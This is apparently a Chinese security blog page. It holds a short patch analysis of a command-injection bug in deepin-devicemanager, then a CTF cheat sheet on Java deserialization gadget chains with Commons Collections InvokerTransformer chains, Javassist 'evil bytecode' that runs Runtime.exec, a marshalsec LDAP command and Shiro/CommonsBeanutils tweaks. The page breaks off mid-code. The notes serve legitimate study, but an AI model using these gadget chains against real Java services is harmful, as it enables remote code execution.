          <h3 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h3><p>deepin-devicemanager服务器的installDriver接口存在命令注入漏洞，管理员用户输入当前密码后可提升至root权限。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>github 上diff installDriver接口</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241111174543825.png" alt="image-20241111174543825"></p>
<p>先看util类的变化。新定义了一个函数Utils::runCmdSafeWithArgs。看代码逻辑，这个函数通过将程序和参数作为单独的参数传递给 QProcess，有效地避免了命令注入风险。</p>
<p>找到使用Utils::runCmdSafeWithArgs的方法，存在两处改进的代码。</p>
<p>代码块一DriverManager::isSigned</p>
<p>升级前代码strSignTool + filepath 这一行将 filepath（文件路径）直接拼接到命令行字符串options中；</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241111174659510.png" alt="image-20241111174659510"></p>
<p>代码块 二同理。</p>
<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>改进后的代码中，命令和参数被清晰地分开处理。program 保存了要执行的命令，而 arguments 则是命令的参数列表。确保了 filepath&#x2F;strPkgName 只是作为一个参数传递，而不是命令的一部分，即使 filepath&#x2F;strPkgName 中包含恶意字符，也不会被解释为命令的一部分，从而有效防止了命令注入。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/07/19/%E9%93%BE%E5%AD%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Charger0">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Charger0">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/07/19/%E9%93%BE%E5%AD%90/" class="post-title-link" itemprop="url">链子</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-07-20 03:38:24" itemprop="dateCreated datePublished" datetime="2024-07-20T03:38:24+08:00">2024-07-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-11-13 18:35:55" itemprop="dateModified" datetime="2024-11-13T18:35:55+08:00">2024-11-13</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="我的链子-ctf版"><a href="#我的链子-ctf版" class="headerlink" title="我的链子  ctf版"></a>我的链子  ctf版</h1><p>半年前总结的不知道弄哪里去了，粗心关了感觉自己一事无成。</p>
<p>做笔记就得照着自己完全不会的程度做。太傻逼了。</p>
<h2 id="各种依赖"><a href="#各种依赖" class="headerlink" title="各种依赖"></a>各种依赖</h2><h3 id="Hessian"><a href="#Hessian" class="headerlink" title="Hessian"></a>Hessian</h3><dependency>
    <groupId>com.caucho</groupId>
    <artifactId>hessian</artifactId>
    <version>4.0.38</version>
</dependency>
### ROME
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;rome&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;rome&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
### 
<dependency>
    <groupId>com.caucho</groupId>
    <artifactId>resin</artifactId>
    <version>4.0.63</version>
</dependency>

<h3 id="cc3-2-1"><a href="#cc3-2-1" class="headerlink" title="cc3.2.1"></a>cc3.2.1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="JAVASSIT"><a href="#JAVASSIT" class="headerlink" title="JAVASSIT"></a>JAVASSIT</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.20.0-GA&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
<h3 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.7.9&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h3 id="spring-aop"><a href="#spring-aop" class="headerlink" title="spring-aop"></a>spring-aop</h3><dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-aop</artifactId>
    <version>5.2.7.RELEASE</version>
</dependency>

<p>提供了HotSwappableTargetSource.equals()</p>
<h3 id="spring-context"><a href="#spring-context" class="headerlink" title="spring-context"></a>spring-context</h3><dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-context</artifactId>
    <version>4.1.3.RELEASE</version>
</dependency>

<h3 id="aspectjweaver"><a href="#aspectjweaver" class="headerlink" title="aspectjweaver"></a>aspectjweaver</h3><dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjweaver</artifactId>
    <version>1.6.10</version>
</dependency>

<h3 id="xbean"><a href="#xbean" class="headerlink" title="xbean"></a>xbean</h3><dependency> 
    <groupId>org.apache.xbean</groupId>
    <artifactId>xbean-naming</artifactId>
    <version>4.24</version>
</dependency>

<h2 id="复用方法"><a href="#复用方法" class="headerlink" title="复用方法"></a>复用方法</h2><h3 id="起开ldap"><a href="#起开ldap" class="headerlink" title="起开ldap"></a>起开ldap</h3><p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServe<br>r <a target="_blank" rel="noopener" href="http://127.0.0.1:9998/#Exp">http://127.0.0.1:9998/#Exp</a> 1388</p>
<h3 id="序列化成文件"><a href="#序列化成文件" class="headerlink" title="序列化成文件"></a>序列化成文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static Object unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    serialize(o);</span><br><span class="line">    unserialize(&quot;ser.bin&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="什么形式都不变序列化"><a href="#什么形式都不变序列化" class="headerlink" title="什么形式都不变序列化"></a>什么形式都不变序列化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//序列化</span><br><span class="line">ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">oos.writeObject(handler1);</span><br><span class="line">oos.flush();</span><br><span class="line">oos.close();</span><br><span class="line"></span><br><span class="line">//测试反序列化</span><br><span class="line">ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">ois.readObject();</span><br><span class="line">ois.close();</span><br></pre></td></tr></table></figure>

<h3 id="序列化成base64"><a href="#序列化成base64" class="headerlink" title="序列化成base64"></a>序列化成base64</h3><h3 id="evil-bytecode-1"><a href="#evil-bytecode-1" class="headerlink" title="evil bytecode    1"></a>evil bytecode    1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span><br><span class="line"></span><br><span class="line">ClassPool classPool=ClassPool.getDefault();//返回默认的类池</span><br><span class="line">classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径</span><br><span class="line">CtClass payload=classPool.makeClass(&quot;</span><br><span class="line">&quot;);//创建一个新的public类</span><br><span class="line">payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet</span><br><span class="line">payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); //创建一个空的类初始化，设置构造函数主体为runtime</span><br><span class="line"></span><br><span class="line">byte[] bytes=payload.toBytecode();//转换为byte数组</span><br></pre></td></tr></table></figure>
<h3 id="反射设置-Field"><a href="#反射设置-Field" class="headerlink" title="反射设置 Field"></a>反射设置 Field</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static void setFieldValue(Object object, String fieldName, Object value) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        Field field = object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="链传递方法"><a href="#链传递方法" class="headerlink" title="链传递方法"></a>链传递方法</h2><h3 id="CC-依赖-后-rce-instance-前Transformer类的-transform-方法。"><a href="#CC-依赖-后-rce-instance-前Transformer类的-transform-方法。" class="headerlink" title="CC 依赖   后 rce&#x2F;instance   前Transformer类的 transform()方法。"></a>CC 依赖   后 rce&#x2F;instance   前Transformer类的 transform()方法。</h3><p>后链可以实现RCE , 后链的source点是 调用了transform()方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">        new ConstantTransformer(Runtime.class),</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//ChainedTransformer实例</span><br><span class="line">Transformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">chainedTransformer.transform(&quot;test&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="1-InstantiateTransformer"><a href="#1-InstantiateTransformer" class="headerlink" title="1   InstantiateTransformer"></a>1   InstantiateTransformer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class InstantiateTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = 3786388740793356347L;</span><br><span class="line">    public static final Transformer NO_ARG_INSTANCE = new InstantiateTransformer();</span><br><span class="line">    private final Class[] iParamTypes;</span><br><span class="line">    private final Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重写的 transform 方法，反射调用构造函数将类实例化。</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        Constructor con = ((Class)input).getConstructor(this.iParamTypes);</span><br><span class="line">        return con.newInstance(this.iArgs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-InvokerTransformer"><a href="#2-InvokerTransformer" class="headerlink" title="2    InvokerTransformer"></a>2    InvokerTransformer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class InvokerTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = -8653385846894047688L;</span><br><span class="line">    private final String iMethodName;</span><br><span class="line">    private final Class[] iParamTypes;</span><br><span class="line">    private final Object[] iArgs;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        this.iMethodName = methodName;</span><br><span class="line">        this.iParamTypes = paramTypes;</span><br><span class="line">        this.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重写的 transform 方法，反射调用指定的方法并返回方法调用结果</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        if (input == null) &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);</span><br><span class="line">                return method.invoke(input, this.iArgs);</span><br><span class="line">            &#125; catch …………</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-ConstantTransformer"><a href="#3-ConstantTransformer" class="headerlink" title="3   ConstantTransformer"></a>3   ConstantTransformer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class ConstantTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = 6374440726369055124L;</span><br><span class="line">    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);</span><br><span class="line">    private final Object iConstant;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public ConstantTransformer(Object constantToReturn) &#123;</span><br><span class="line">        this.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重写的 transform 方法，获取一个对象类型</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        return this.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="4-ChainedTransformer"><a href="#4-ChainedTransformer" class="headerlink" title="4    ChainedTransformer"></a>4    ChainedTransformer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public class ChainedTransformer implements Transformer, Serializable &#123;</span><br><span class="line">    static final long serialVersionUID = 3514945074733160196L;</span><br><span class="line">    private final Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    //构造函数</span><br><span class="line">    public ChainedTransformer(Transformer[] transformers) &#123;</span><br><span class="line">        this.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //重写的 transform 方法，链式调用  Transformer[] 中每个 Transformer 的 transform 方法</span><br><span class="line">    public Object transform(Object object) &#123;</span><br><span class="line">        for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = this.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="javassit"><a href="#javassit" class="headerlink" title="javassit"></a>javassit</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/13811335.html">https://www.cnblogs.com/nice0e3/p/13811335.html</a></p>
<h3 id="原生类-UnixPrintService-前get"><a href="#原生类-UnixPrintService-前get" class="headerlink" title="原生类 UnixPrintService  前get()"></a>原生类 UnixPrintService  前get()</h3><p>在unix下有用，rce  。这个类有诸多 get 方法，通过拼接字符串的方式执行系统命令。可惜这个类在高版本被移除</p>
<h3 id="原生类-SignedObject"><a href="#原生类-SignedObject" class="headerlink" title="原生类 SignedObject"></a>原生类 SignedObject</h3><p>java.security.SignedObject有个 getObject 方法会从流里使用原生反序列化读取数据，就造成了二次反序列化。</p>
<h3 id="原生类BeanContextSupport-readObject流程里有try-catch且不影响反序列化流程的类。-用动态代理封装后，"><a href="#原生类BeanContextSupport-readObject流程里有try-catch且不影响反序列化流程的类。-用动态代理封装后，" class="headerlink" title="原生类BeanContextSupport  readObject流程里有try catch且不影响反序列化流程的类。 用动态代理封装后，"></a>原生类BeanContextSupport  readObject流程里有try catch且不影响反序列化流程的类。 用动态代理封装后，</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    synchronized(BeanContext.globalHierarchyLock) &#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        initialize();</span><br><span class="line"></span><br><span class="line">        bcsPreDeserializationHook(ois);</span><br><span class="line"></span><br><span class="line">        if (serializable &gt; 0 &amp;&amp; this.equals(getBeanContextPeer()))</span><br><span class="line">            readChildren(ois);</span><br><span class="line"></span><br><span class="line">        deserialize(ois, bcmListeners = new ArrayList(1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public final void readChildren(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    int count = serializable;</span><br><span class="line"></span><br><span class="line">    while (count-- &gt; 0) &#123;</span><br><span class="line">        Object                      child = null;</span><br><span class="line">        BeanContextSupport.BCSChild bscc  = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            child = ois.readObject();</span><br><span class="line">            bscc  = (BeanContextSupport.BCSChild)ois.readObject();</span><br><span class="line">        &#125; catch (IOException ioe) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125; catch (ClassNotFoundException cnfe) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="原生类-java-util-Collections-ReverseComparator-有CB依赖时常用-用于生成BeanComparator"><a href="#原生类-java-util-Collections-ReverseComparator-有CB依赖时常用-用于生成BeanComparator" class="headerlink" title="原生类 java.util.Collections$ReverseComparator  有CB依赖时常用  用于生成BeanComparator"></a>原生类 java.util.Collections$ReverseComparator  有CB依赖时常用  用于生成BeanComparator</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package java.util;</span><br><span class="line">public class Collections&#123;</span><br><span class="line">    public static &lt;T&gt; Comparator&lt;T&gt; reverseOrder() &#123;  // 直接调用这里</span><br><span class="line">        return (Comparator&lt;T&gt;) ReverseComparator.REVERSE_ORDER;  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    private static class ReverseComparator implements Comparator&lt;Comparable&lt;Object&gt;&gt;, Serializable &#123;</span><br><span class="line">        static final ReverseComparator REVERSE_ORDER = new ReverseComparator();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用代码 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//修改CommonsBeanutilsShiro类代码</span><br><span class="line"></span><br><span class="line">BeanComparator beanComparator = new BeanComparator(null, Collections.reverseOrder());  // 修改一下这里就可以</span><br><span class="line">PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, beanComparator);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="shiro依赖-自带的CB-tomcat应用下可能有CC"><a href="#shiro依赖-自带的CB-tomcat应用下可能有CC" class="headerlink" title="shiro依赖 自带的CB  tomcat应用下可能有CC"></a>shiro依赖 自带的CB  tomcat应用下可能有CC</h3><h5 id="BeanComparator-后可compare-调到-invoketransform-transform-》-rce-templateimpl"><a href="#BeanComparator-后可compare-调到-invoketransform-transform-》-rce-templateimpl" class="headerlink" title="BeanComparator  后可compare 调到 invoketransform.transform -》 rce | templateimpl"></a>BeanComparator  后可compare 调到 invoketransform.transform -》 rce | templateimpl</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class BeanComparator implements Comparator, Serializable &#123;</span><br><span class="line">    private String property;</span><br><span class="line">    private Comparator comparator;</span><br><span class="line"></span><br><span class="line">    public BeanComparator() &#123;  // 构造方法1</span><br><span class="line">        this( null );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public BeanComparator( String property ) &#123;  // 构造方法2</span><br><span class="line">        this( property, ComparableComparator.getInstance() );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public BeanComparator( String property, Comparator comparator ) &#123; // 构造方法3    这里传入的comparator可以是Comparator的继承类。这个特性需要复习</span><br><span class="line">        setProperty( property );</span><br><span class="line">        if (comparator != null) &#123;</span><br><span class="line">            this.comparator = comparator;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            this.comparator = ComparableComparator.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到，想要不使用ComparableComparator这个类，必须在构造方法3处给入comparator参数，由于comparator必须存在，但具体什么类型并不影响后面的调用链，所以给进去的这个类要满足三个条件即可：</p>
<p>实现java.util.Comparator接口<br>实现java.io.Serializable接口<br>Java、shiro或commons-beanutils自带，且兼容性强<br>这里直接用一下大佬给出的两个类：</p>
<p>String.CASE_INSENSITIVE_ORDER获取运行环境中的CaseInsensitiveComparator类<br>java.util.Collections$ReverseComparator</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Hashtable-原生类-equal-调-AbstractMap-equals-调lazymap-get-这里有点绕-照着7的链子改"><a href="#Hashtable-原生类-equal-调-AbstractMap-equals-调lazymap-get-这里有点绕-照着7的链子改" class="headerlink" title="Hashtable  原生类   equal 调 AbstractMap.equals 调lazymap.get()   这里有点绕 照着7的链子改"></a>Hashtable  原生类   equal 调 AbstractMap.equals 调lazymap.get()   这里有点绕 照着7的链子改</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 